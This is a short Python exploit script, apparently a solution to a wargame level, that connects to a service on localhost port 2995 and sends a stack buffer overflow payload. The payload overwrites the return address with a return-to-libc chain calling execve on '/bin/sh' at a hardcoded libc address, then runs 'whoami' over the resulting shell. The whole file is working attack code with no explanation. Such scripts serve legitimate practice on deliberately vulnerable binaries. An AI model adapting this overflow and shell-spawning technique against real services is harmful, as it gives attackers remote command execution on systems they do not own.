import struct
import socket

created_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
created_socket.connect(('127.0.0.1', 2995))

execve_addr = struct.pack("I", 0x08048c0c)
execve_argument2 = '\x00' * 4
execve_argument3 = '\x00' * 4
binsh_addr_in_libc = 0x11f3bf
binsh_loaded_addr = 0xb7e97000
binsh_addr = struct.pack("I", binsh_addr_in_libc + binsh_loaded_addr)
fake_ret_addr = 'AAAA'


payload = 'a' * 511 + '\x00' + 'a' * 20 + execve_addr + fake_ret_addr + binsh_addr + execve_argument2 + execve_argument3

created_socket.sendall(payload + '\n')

created_socket.sendall('whoami' + '\n')
response = created_socket.recv(1000)
print(response)

created_socket.close()